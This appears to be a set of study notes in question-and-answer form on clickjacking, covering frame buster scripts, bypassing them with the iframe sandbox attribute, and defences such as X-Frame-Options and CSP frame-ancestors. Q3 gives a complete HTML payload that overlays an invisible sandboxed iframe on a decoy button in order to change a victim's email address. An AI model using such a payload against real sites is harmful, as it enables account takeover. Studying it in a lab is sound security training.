---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how a frame buster script works and its purpose in preventing clickjacking attacks.**

A frame buster script is a piece of JavaScript embedded in a webpage that detects if the page is being loaded inside an iframe. If it is, the script redirects the top-level window to itself, effectively breaking out of the iframe. This prevents attackers from framing the page and performing clickjacking attacks, where users are tricked into interacting with a hidden iframe.

**Q2. How can an attacker bypass a frame buster script to perform a clickjacking attack?**

An attacker can bypass a frame buster script by using the `sandbox` attribute in the iframe tag. By setting the `sandbox` attribute with specific permissions (like `allow-forms`), the attacker can disable certain functionalities of the framed content, such as top-level navigation, while still allowing form submissions. This allows the attacker to frame the page and trick the user into interacting with it without triggering the frame buster.

**Q3. Describe the steps to craft an HTML payload for a clickjacking attack that changes a user's email address.**

To craft an HTML payload for a clickjacking attack that changes a user's email address, follow these steps:

1. Identify the URL of the target page that updates the email address.
2. Add a query parameter to the URL to pre-populate the email field with the attacker-controlled email address.
3. Create an iframe in the HTML payload that points to the target URL with the pre-populated email parameter.
4. Use the `sandbox` attribute in the iframe to allow form submissions but prevent top-level navigation.
5. Style the iframe to be invisible and position it over a visible "Click Me" button.
6. Deliver the HTML payload to the victim and trick them into clicking on the "Click Me" button, which triggers the form submission in the hidden iframe.

Here is an example payload:

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        #hiddenFrame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            opacity: 0.00001;
        }
        #decoyButton {
            position: absolute;
            top: 50px;
            left: 50px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <iframe id="hiddenFrame" src="https://targetsite.com/update-email?email=attacker@example.com" sandbox="allow-forms"></iframe>
    <div id="decoyButton">Click Me</div>
</body>
</html>
```

**Q4. Why is changing a user's email address through a clickjacking attack considered a serious security issue?**

Changing a user's email address through a clickjacking attack is a serious security issue because it can lead to full account compromise. Once the email address is changed to one controlled by the attacker, they can use the "forgot password" functionality to reset the user's password and gain full access to the account. This can result in unauthorized access to sensitive information, financial losses, and other malicious activities.

**Q5. How can web developers protect against clickjacking attacks?**

Web developers can protect against clickjacking attacks by implementing the following measures:

1. **X-Frame-Options Header**: Set the `X-Frame-Options` HTTP header to `DENY` or `SAMEORIGIN`. This instructs browsers not to allow the page to be framed by external sites.
   
   Example:
   ```http
   X-Frame-Options: DENY
   ```

2. **Content Security Policy (CSP)**: Use CSP to restrict the sources from which the browser can load resources. Specifically, the `frame-ancestors` directive can be used to specify which origins are allowed to frame the page.

   Example:
   ```http
   Content-Security-Policy: frame-ancestors 'self'
   ```

3. **JavaScript Frame Buster**: Implement a frame buster script that breaks out of the iframe if the page is detected to be framed. However, this method can be bypassed by attackers using the `sandbox` attribute.

4. **User Education**: Educate users about the risks of clicking on suspicious links and the importance of verifying the authenticity of websites before entering sensitive information.

By combining these techniques, web developers can significantly reduce the risk of clickjacking attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/05-Clickjacking/04-Lab 3 Clickjacking with a frame buster script/02-Introduction to Clickjacking|Introduction to Clickjacking]] | [[Web Security (PortSwigger)/05-Clickjacking/04-Lab 3 Clickjacking with a frame buster script/00-Overview|Overview]]
